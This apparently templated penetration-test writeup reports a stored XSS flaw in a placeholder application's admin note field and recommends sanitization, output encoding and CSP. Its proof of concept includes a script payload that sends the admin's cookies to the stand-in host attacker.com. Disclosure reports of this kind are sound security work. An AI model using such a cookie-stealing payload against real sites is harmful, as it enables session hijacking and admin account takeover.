# Penetration Testing Writeup: XSS in Admin Panel

## Executive Summary

A Stored Cross-Site Scripting (XSS) vulnerability was found in [Target
Application]’s admin panel during a penetration test. This allows attackers to
inject scripts into admin inputs, affecting admin users. This report details the
issue and remediation steps.

## Vulnerability Details

- **Vulnerability Type**: Cross-Site Scripting (XSS) - Stored
- **Severity**: Critical
- **Affected Component**: Admin note field
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Location**: `https://[target-application]/admin/notes`
- **Discovered By**: [PenTester Name]
- **Date Discovered**: August 30, 2025

### Description

The admin note field does not sanitize inputs before storing and displaying
them, allowing script execution in the admin panel.

### Impact

- **Admin Account Takeover**: Admin cookies can be stolen.
- **Data Exfiltration**: Admin data can be sent to attackers.
- **Phishing**: Fake forms can capture admin credentials.
- **System Compromise**: Admin access can lead to full system control.

### Proof of Concept

1. In the admin panel, add a note: `<script>alert('Stored XSS');</script>`.
2. View the note and observe the alert.
3. Malicious payload:
   `<script>fetch('https://attacker.com/steal?cookie='+document.cookie);</script>`.

### Steps to Reproduce

1. Log in to `https://[target-application]/admin/notes`.
2. Add a note with `<script>alert('Stored XSS');</script>`.
3. View the note to confirm the alert.

## Remediation Recommendations

1. **Input Sanitization**:
   - Use OWASP AntiSamy for note inputs.
2. **Output Encoding**:
   - Encode notes before rendering.
3. **Content Security Policy**:
   - Apply CSP: `Content-Security-Policy: script-src 'self';`.
4. **Secure Development**:
   - Train admins and developers on XSS prevention.
5. **Security Testing**:
   - Conduct regular audits.

## Conclusion

The Stored XSS vulnerability in [Target Application]’s admin panel is critical
and requires immediate remediation.

## References

- OWASP XSS Prevention Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79: https://cwe.mitre.org/data/definitions/79.html

![Admin XSS Example](https://example.com/images/admin-xss-example.png)
